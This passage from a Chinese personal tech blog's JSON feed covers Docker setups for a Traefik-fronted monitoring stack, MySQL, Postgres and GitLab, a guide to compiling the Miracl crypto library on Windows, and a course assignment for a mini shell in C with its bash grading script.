&quot;traefik.http.services.frontend.loadbalancer.server.port=9000&quot; - &quot;traefik.http.routers.frontend.service=frontend&quot; # Edge - &quot;traefik.http.routers.edge.rule=Host(`portainer.cloud.tencent.com`)&quot; - &quot;traefik.http.services.edge.loadbalancer.server.port=8000&quot; - &quot;traefik.http.routers.edge.service=edge&quot; cadvisor: image: google/cadvisor:latest container_name: cadvisor volumes: - /:/rootfs:ro - /var/run:/var/run:rw - /sys:/sys:ro - /var/lib/docker/:/var/lib/docker:ro labels: - &quot;traefik.enable=true&quot; - &quot;traefik.http.routers.cadvisor.rule=Host(`cadvisor.cloud.tencent.com`)&quot; - &quot;traefik.http.services.cadvisor.loadbalancer.server.port=8080&quot; prometheus: image: prom/prometheus volumes: - ./prometheus:/etc/prometheus labels: - &quot;traefik.enable=true&quot; - &quot;traefik.http.routers.prometheus.rule=Host(`prometheus.cloud.tencent.com`)&quot; - &quot;traefik.http.services.prometheus.loadbalancer.server.port=9090&quot; extra_hosts: - &quot;prometheus.cloud.tencent.com:172.17.0.1&quot; - &quot;cadvisor.cloud.tencent.com:172.17.0.1&quot; - &quot;node-exporter.cloud.tencent.com:172.17.0.1&quot; influxdb: image: influxdb volumes: - ./influxdb:/var/lib/influxdb labels: - &quot;traefik.enable=true&quot; - &quot;traefik.http.routers.influxdb.rule=Host(`influxdb.cloud.tencent.com`)&quot; - &quot;traefik.http.services.influxdb.loadbalancer.server.port=8086&quot; extra_hosts: - &quot;prometheus.cloud.tencent.com:172.17.0.1&quot; - &quot;influxdb.cloud.tencent.com:172.17.0.1&quot; grafana: image: grafana/grafana volumes: - ./grafana:/var/lib/grafana labels: - &quot;traefik.enable=true&quot; - &quot;traefik.http.routers.grafana.rule=Host(`grafana.cloud.tencent.com`)&quot; - &quot;traefik.http.services.grafana.loadbalancer.server.port=3000&quot; extra_hosts: - &quot;prometheus.cloud.tencent.com:172.17.0.1&quot; - &quot;influxdb.cloud.tencent.com:172.17.0.1&quot; node-exporter: image: prom/node-exporter container_name: node-exporter command: - &#x27;--path.rootfs=/host&#x27; volumes: - &#x27;/:/host:ro,rslave&#x27; pid: host labels: - &quot;traefik.enable=true&quot; - &quot;traefik.http.routers.node-exporter.rule=Host(`node-exporter.cloud.tencent.com`)&quot; - &quot;traefik.http.services.node-exporter.loadbalancer.server.port=9100&quot;","summary":"数据库关系型数据库MySQL123docker run -p 3306:3306 --name mysql \\ -v &quot;$(pwd)/mysql&quot;:/var/lib/mysql \\ -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 Postgres1234docker run --name postgres \\ -v &quot;$(pwd)/postgres&quot;:/var/lib/postgresql/data \\ -e POSTGRES_PASSWORD=123456 \\ -p 5432:5432 -d postgres","date_published":"2021-02-26T13:40:00.000Z","tags":["Docker","容器"]},{"id":"https://zhaoqi.vip/posts/2543483413/","url":"https://zhaoqi.vip/posts/2543483413/","title":"Windows下编译Miracl密码库","content_html":"<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h1><p>Miracl是一个密码学C语言函数库,网上针对Windows环境下使用的教程都是使用MSVC编译的,步骤比较繁琐,还需安装Visual Studio。看了一下官网文档,是支持使用gcc进行编译的,遂尝试了一下。</p>\n<h1 id=\"所需环境\"><a href=\"#所需环境\" class=\"headerlink\" title=\"所需环境\"></a>所需环境</h1><ul>\n<li><a href=\"http://www.codeblocks.org/downloads\">CodeBlocks</a></li>\n<li><a href=\"https://gitforwindows.org/\">Git Bash</a><span id=\"more\"></span></li>\n</ul>\n<h1 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h1><ol>\n<li>从Github上下载项目最新源码。(<a href=\"https://github.com/miracl/MIRACL/archive/master.zip\">下载地址</a>)</li>\n<li>打开Git Bash,创建一个文件夹<code>miracl</code>，并将压缩文件拷贝至此。<br><code>mkdir miracl</code></li>\n<li>打开Git Bash，输入如下命令，将所有文件解压到一个目录中。<br><code>unzip -j -aa -L master.zip</code></li>\n<li>编辑<code>gcdoit.bat</code>，注释掉最后几行并保存。<img data-src=\"/posts/2543483413/pasted-1.png\" class=\"\"></li>\n<li>执行<code>gcdoit.bat</code>,生成的<code>miracl.a</code>即为编译好的库。</li>\n</ol>\n<h1 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h1><ol>\n<li><p>打开CodeBlocks，新建Console application项目。</p>\n<img data-src=\"/posts/2543483413/pasted-2.png\" class=\"\"></li>\n<li><p>将<code>mirdef.h</code>、<code>miracl.h</code>、<code>miracl.a</code>拷贝至项目根目录。</p>\n</li>\n<li><p>对着CB左侧工作空间中的项目名右键，点击添加文件,将上述三个文件添加至项目中。</p>\n<img data-src=\"/posts/2543483413/pasted-3.png\" class=\"\"></li>\n<li><p>CB会弹出如下错误提示,莫慌.</p>\n<img data-src=\"/posts/2543483413/error.png\" class=\"\"></li>\n<li><p>对着CB左侧工作空间中的项目名右键,点击生成选项,修改链接器设置.</p>\n<img data-src=\"/posts/2543483413/pasted-4.png\" class=\"\">\n<div class=\"note warning\">\n            <p>环境设置选择: 仅使用项目选项</p>\n          </div></li>\n<li><p>在<code>main.c</code>中输入如下代码，进行测试。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;miracl.h&quot;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span>  <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    big x,y,z;</span><br><span class=\"line\">    miracl *mip = <span class=\"built_in\">mirsys</span>(<span class=\"number\">1000</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    x= <span class=\"built_in\">mirvar</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    y= <span class=\"built_in\">mirvar</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    z= <span class=\"built_in\">mirvar</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">bigbits</span>(<span class=\"number\">100</span>,x);</span><br><span class=\"line\">    <span class=\"built_in\">bigbits</span>(<span class=\"number\">100</span>,y);</span><br><span class=\"line\">    <span class=\"built_in\">bigbits</span>(<span class=\"number\">100</span>,z);</span><br><span class=\"line\">    <span class=\"built_in\">add</span>(x,y, z);</span><br><span class=\"line\">    <span class=\"built_in\">cotnum</span>(z,stdout);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n<li><p>点击CB中的生成并运行按钮，如图所示。</p>\n<img data-src=\"/posts/2543483413/pasted-5.png\" class=\"\" title=\"运行结果图\">\n</li>\n<li><p>gcc编译命令为:</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc filename.c miracl.a -o filename</span><br><span class=\"line\">./filename.exe</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><ul>\n<li><a href=\"https://www.cnblogs.com/little-kwy/p/12285955.html\">树莓派下编译并使用miracl密码库</a></li>\n<li><a href=\"https://blog.csdn.net/joker_clown/article/details/83662846\">win10+gcc+miracl</a></li>\n</ul>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"介绍Miracl是一个密码学C语言函数库,网上针对Windows环境下使用的教程都是使用MSVC编译的,步骤比较繁琐,还需安装Visual Studio。看了一下官网文档,是支持使用gcc进行编译的,遂尝试了一下。 所需环境 CodeBlocks Git Bash 编译 从Github上下载项目最新源码。(下载地址) 打开Git Bash,创建一个文件夹miracl，并将压缩文件拷贝至此。mkdir miracl 打开Git Bash，输入如下命令，将所有文件解压到一个目录中。unzip -j -aa -L master.zip 编辑gcdoit.bat，注释掉最后几行并保存。 执行gcdoit.bat,生成的miracl.a即为编译好的库。 测试 打开CodeBlocks，新建Console application项目。 将mirdef.h、miracl.h、miracl.a拷贝至项目根目录。 对着CB左侧工作空间中的项目名右键，点击添加文件,将上述三个文件添加至项目中。 CB会弹出如下错误提示,莫慌. 对着CB左侧工作空间中的项目名右键,点击生成选项,修改链接器设置. 环境设置选择: 仅使用项目选项 在main.c中输入如下代码，进行测试。 1234567891011121314#include &quot;miracl.h&quot;int main() &#123; big x,y,z; miracl *mip = mirsys(1000, 16); x= mirvar(0); y= mirvar(0); z= mirvar(0); bigbits(100,x); bigbits(100,y); bigbits(100,z); add(x,y, z); cotnum(z,stdout); return 0;&#125; 点击CB中的生成并运行按钮，如图所示。 gcc编译命令为: 12gcc filename.c miracl.a -o filename./filename.exe 参考资料 树莓派下编译并使用miracl密码库 win10+gcc+miracl","summary":"介绍Miracl是一个密码学C语言函数库,网上针对Windows环境下使用的教程都是使用MSVC编译的,步骤比较繁琐,还需安装Visual Studio。看了一下官网文档,是支持使用gcc进行编译的,遂尝试了一下。 所需环境 CodeBlocks Git Bash","date_published":"2020-04-20T08:32:00.000Z","tags":["Miracl","密码学"]},{"id":"https://zhaoqi.vip/posts/151510421/","url":"https://zhaoqi.vip/posts/151510421/","title":"Docker搭建Gitlab仓库","content_html":"<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><ol>\n<li>拉取Gitlab镜像<br><code>docker pull gitlab/gitlab-ce</code></li>\n</ol>\n<img data-src=\"/posts/151510421/pasted-1.png\" class=\"\">\n\n<ol start=\"2\">\n<li><p>创建文件夹<br><code>mkdir gitlab</code></p>\n<span id=\"more\"></span>\n</li>\n<li><p>创建容器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d  -p 8001:8001 -p 222:22 --name gitlab   \\</span><br><span class=\"line\">    -v <span class=\"string\">&quot;<span class=\"subst\">$(pwd)</span>/gitlab/config&quot;</span>:/etc/gitlab \\</span><br><span class=\"line\">    -v <span class=\"string\">&quot;<span class=\"subst\">$(pwd)</span>/gitlab/logs&quot;</span>:/var/log/gitlab \\</span><br><span class=\"line\">    -v <span class=\"string\">&quot;<span class=\"subst\">$(pwd)</span>/gitlab/data&quot;</span>:/var/opt/gitlab \\</span><br><span class=\"line\">    --restart=always gitlab/gitlab-ce</span><br></pre></td></tr></table></figure></li>\n</ol>\n<div class=\"note info\">\n            <p>也可以将8001修改为其他端口</p>\n          </div>\n\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><ol>\n<li><p>修改配置文件<br><code>vi gitlab/config/gitlab.rb</code><br><code>external_url &#39;http://www.xxx.com:8001&#39;</code> or <code>external_url &#39;http://&#123;ip&#125;:8001&#39;</code></p>\n</li>\n<li><p>重启容器<br><code>docker restart gitlab</code></p>\n</li>\n</ol>\n<h1 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h1><ol>\n<li>首次打开时需要设置管理员密码<img data-src=\"/posts/151510421/pasted-2.jpg\" class=\"\"></li>\n<li>查看Clone信息<img data-src=\"/posts/151510421/pasted-0.png\" class=\"\"></li>\n</ol>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"安装 拉取Gitlab镜像docker pull gitlab/gitlab-ce 创建文件夹mkdir gitlab 创建容器 12345docker run -d -p 8001:8001 -p 222:22 --name gitlab \\ -v &quot;$(pwd)/gitlab/config&quot;:/etc/gitlab \\ -v &quot;$(pwd)/gitlab/logs&quot;:/var/log/gitlab \\ -v &quot;$(pwd)/gitlab/data&quot;:/var/opt/gitlab \\ --restart=always gitlab/gitlab-ce 也可以将8001修改为其他端口 配置 修改配置文件vi gitlab/config/gitlab.rbexternal_url &#39;http://www.xxx.com:8001&#39; or external_url &#39;http://&#123;ip&#125;:8001&#39; 重启容器docker restart gitlab 使用 首次打开时需要设置管理员密码 查看Clone信息","summary":"安装 拉取Gitlab镜像docker pull gitlab/gitlab-ce 创建文件夹mkdir gitlab","date_published":"2020-02-26T03:49:00.000Z","tags":["Gitlab","Docker"]},{"id":"https://zhaoqi.vip/posts/1118750159/","url":"https://zhaoqi.vip/posts/1118750159/","title":"C语言实现一个迷你Shell","content_html":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>俄勒冈州立大学（Oregon State University) CS 344作业,使用C语言实现一个Shell.</p>\n<span id=\"more\"></span>\n\n<h1 id=\"要求\"><a href=\"#要求\" class=\"headerlink\" title=\"要求\"></a>要求</h1><ul>\n<li>内置 <code>cd</code>,<code>status</code>和<code>exit</code> 命令</li>\n<li>支持输入和输出的重定向</li>\n<li>支持后台运行(&amp;)</li>\n<li>Ctrl-Z 与 Ctrl-C</li>\n<li>调用系统其他命令</li>\n<li>替换命令中的<code>$$</code>为Shell的<code>PID</code></li>\n</ul>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><h2 id=\"作业pdf\"><a href=\"#作业pdf\" class=\"headerlink\" title=\"作业pdf\"></a>作业pdf</h2><div class=\"pdf\" target=\"./Program3.pdf\" height=\"\"></div>\n\n<h2 id=\"测试脚本\"><a href=\"#测试脚本\" class=\"headerlink\" title=\"测试脚本\"></a>测试脚本</h2><figure class=\"highlight bash\"><figcaption><span>p3testscript</span><a href=\"/downloads/code/p3testscript\">view raw</a></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;PRE-SCRIPT INFO&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;  Grading Script PID: $$&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;  Note: your smallsh will report a different PID when evaluating $$&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">./smallsh &lt;&lt;<span class=\"string\">&#x27;___EOF___&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> BEGINNING TEST SCRIPT</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> Using comment (5 points <span class=\"keyword\">if</span> only next prompt is displayed next)</span><br><span class=\"line\"><span class=\"comment\">#THIS COMMENT SHOULD DO NOTHING</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">ls</span> (10 points <span class=\"keyword\">for</span> returning <span class=\"built_in\">dir</span> contents)</span><br><span class=\"line\"><span class=\"built_in\">ls</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">ls</span> out junk</span><br><span class=\"line\"><span class=\"built_in\">ls</span> &gt; junk</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">cat</span> junk (15 points <span class=\"keyword\">for</span> correctly returning contents of junk)</span><br><span class=\"line\"><span class=\"built_in\">cat</span> junk</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">wc</span> <span class=\"keyword\">in</span> junk (15 points <span class=\"keyword\">for</span> returning correct numbers from <span class=\"built_in\">wc</span>)</span><br><span class=\"line\"><span class=\"built_in\">wc</span> &lt; junk</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">wc</span> <span class=\"keyword\">in</span> junk out junk2; <span class=\"built_in\">cat</span> junk2 (10 points <span class=\"keyword\">for</span> returning correct numbers from <span class=\"built_in\">wc</span>)</span><br><span class=\"line\"><span class=\"built_in\">wc</span> &lt; junk &gt; junk2</span><br><span class=\"line\"><span class=\"built_in\">cat</span> junk2</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">test</span> -f badfile (10 points <span class=\"keyword\">for</span> returning error value of 1, note extraneous &amp;)</span><br><span class=\"line\"><span class=\"built_in\">test</span> -f badfile</span><br><span class=\"line\">status &amp;</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">wc</span> <span class=\"keyword\">in</span> badfile (10 points <span class=\"keyword\">for</span> returning text error)</span><br><span class=\"line\"><span class=\"built_in\">wc</span> &lt; badfile</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> badfile (10 points <span class=\"keyword\">for</span> returning text error)</span><br><span class=\"line\">badfile</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">sleep</span> 100 background (10 points <span class=\"keyword\">for</span> returning process ID of sleeper)</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 100 &amp;</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> pkill -signal SIGTERM <span class=\"built_in\">sleep</span> (10 points <span class=\"keyword\">for</span> pid of killed process, 10 points <span class=\"keyword\">for</span> signal)</span><br><span class=\"line\"><span class=\"built_in\">echo</span> (Ignore message about Operation Not Permitted)</span><br><span class=\"line\">pkill <span class=\"built_in\">sleep</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">sleep</span> 1 background (10 pts <span class=\"keyword\">for</span> pid of <span class=\"built_in\">bg</span> ps when <span class=\"keyword\">done</span>, 10 <span class=\"keyword\">for</span> <span class=\"built_in\">exit</span> value)</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 1 &amp;</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">pwd</span></span><br><span class=\"line\"><span class=\"built_in\">pwd</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">cd</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">pwd</span> (10 points <span class=\"keyword\">for</span> being <span class=\"keyword\">in</span> the HOME <span class=\"built_in\">dir</span>)</span><br><span class=\"line\"><span class=\"built_in\">pwd</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">mkdir</span> testdir$$</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> testdir$$</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">cd</span> testdir$$</span><br><span class=\"line\"><span class=\"built_in\">cd</span> testdir$$</span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">pwd</span> (5 points <span class=\"keyword\">for</span> being <span class=\"keyword\">in</span> the newly created <span class=\"built_in\">dir</span>)</span><br><span class=\"line\"><span class=\"built_in\">pwd</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> --------------------</span><br><span class=\"line\"><span class=\"built_in\">echo</span> Testing foreground-only mode (20 points <span class=\"keyword\">for</span> entry &amp; <span class=\"built_in\">exit</span> text AND ~5 seconds between <span class=\"built_in\">times</span>)</span><br><span class=\"line\"><span class=\"built_in\">kill</span> -SIGTSTP $$</span><br><span class=\"line\"><span class=\"built_in\">date</span></span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5 &amp;</span><br><span class=\"line\"><span class=\"built_in\">date</span></span><br><span class=\"line\"><span class=\"built_in\">kill</span> -SIGTSTP $$</span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br><span class=\"line\">___EOF___</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h1><figure class=\"highlight c\"><figcaption><span>smallsh.c</span><a href=\"/downloads/code/smallsh.c\">view raw</a></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span 